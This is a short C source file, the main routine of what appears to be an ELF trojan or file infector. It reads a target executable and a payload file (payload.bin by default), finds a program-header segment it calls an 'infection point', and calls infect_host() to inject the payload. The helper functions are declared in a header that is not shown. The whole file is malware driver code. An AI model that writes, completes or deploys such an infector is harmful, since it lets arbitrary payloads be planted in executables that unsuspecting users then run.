#include "trojan.h"



int main(int argc,char **argv)
{
    int opt;
    unsigned char *target_elf = NULL;
    unsigned char *payload = NULL;


    while ((opt = getopt(argc, argv, "f:p:")) != -1) {
        switch (opt) {
            case 'f':
                target_elf = optarg;
                break;
            case 'p':
                payload = optarg;
                break;
        }
    }

    if(target_elf == NULL)
    {
        printf("Usage:%s -f Target ELF [-p] payload\n", argv[0]);
        return 1;
    }

    open_map_file(target_elf);

    if(payload == NULL){
        extract_payload("payload.bin");
    }else{
        extract_payload(payload);
    }

    int segment = find_phdr();
    if(segment<0)
    {
        printf("unable to find usable infection point\n");
        exit(EXIT_FAILURE);
    }

    infect_host(segment);


    return 0;
}
